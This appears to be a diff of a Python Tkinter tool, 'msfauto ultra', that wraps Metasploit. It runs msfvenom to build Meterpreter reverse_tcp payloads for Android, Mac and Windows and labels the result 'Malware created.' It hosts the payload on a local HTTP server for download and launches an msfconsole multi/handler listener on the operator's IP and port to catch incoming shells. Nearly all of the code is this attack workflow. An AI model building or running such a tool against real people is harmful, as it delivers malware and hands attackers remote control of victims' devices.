@@ -1,7 +1,8 @@
 # /bin/shell
 from tkinter import * 
+from tkinter import messagebox as msg
 from colorama import Fore, Back, Style, init
-import platform, os, random, time
+import platform, os, random, time, subprocess
 init(autoreset=True)
 class msfauto_ultra():
     def __init__(self, app_name, ip, port_one, port_two, payload):
@@ -15,7 +16,9 @@ class msfauto_ultra():
         elif self.payload == "mac": os.system(f"msfvenom -p python/meterpreter/reverse_tcp > /Output/{self.app_name}.py")
         else: os.system(f"msfvenom -p windows/meterpreter/reverse_tcp -f exe > /Output/{self.app_name}.exe")
         print(Fore.GREEN + "Malware created. continue...")
-    def craete_http_server(self): os.system(f"cd Output && python3 -m http.server {self.port2} -b {self.ip}"), print(Fore.RED + "You closed http server.")
+    def craete_http_server(self):
+        # subprocess.call("/bin/shell")
+        os.system(f"cd Output && python3 -m http.server {self.port2} -b {self.ip}"), print(Fore.RED + "You closed http server.")
     def return_links(self):  
         pass
         # print(Fore.WHITE + "\n\nThis is the malware download link: ")
@@ -27,7 +30,8 @@ class msfauto_ultra():
         # print(f"ngrok http {self.port2}")
     def start_msfconsole(self):
         print(Style.BRIGHT + Fore.GREEN + "Starting msfconsole...\n")
-        os.system(f'msfconsole -x "set PAYLOAD {self.payload}" -x "use exploit/multi/handler" -x "set LHOST {self.ip}" -x "set LPORT {self.port1}" -x "exploit"')
+        # subprocess.call("/bin/shell")
+        # os.system(f'msfconsole -x "set PAYLOAD {self.payload}" -x "use exploit/multi/handler" -x "set LHOST {self.ip}" -x "set LPORT {self.port1}" -x "exploit"')
 def banner():
     banners = {
         1 : f"""{Fore.CYAN}
@@ -112,6 +116,7 @@ def get_info():
         with open("config", "w") as writer:
             writer.write(f"{app_name.get()},{ip.get()},{port1.get()},{port2.get()},{payload.get()}")
             root.destroy()
+            msg.showinfo("Completed", "Geting data is completed.")
     Button(root, command=save, text="submit", width=8, height=2).place(x=300, y=290)
     root.geometry("500x350")
     root.title("Get informations")
@@ -124,3 +129,23 @@ def read_info():
         reader = reader.split(",")
     msfultra = msfauto_ultra(app_name=reader[0], ip=reader[1], port_one=reader[2], port_two=reader[3], payload=reader[4])
     return msfultra
+def mainapp():
+    root = Tk()
+    msfultra = read_info()
+    Button(root, text="Start msfconsole", width=50, height=5,  command=msfultra.start_msfconsole).pack()
+    Button(root, text="Start server", width=50, height=5, command=msfultra.craete_http_server).pack()
+    with open("config", "r") as read:
+        reader = read.readlines()
+        reader = "".join(reader)
+        reader = reader.split(",")
+    app_name = reader[0] 
+    ip = reader[1]
+    port_one = reader[2]
+    port_two = reader[3] 
+    payload = reader[4]
+    Label(root, text=f""" Your IP is: {ip}
+Your first port is: {port_one}
+      Your second port is: {port_two}""").pack()
+    root.resizable(False, False)
+    root.title("msfauto ultra")
+    root.mainloop()
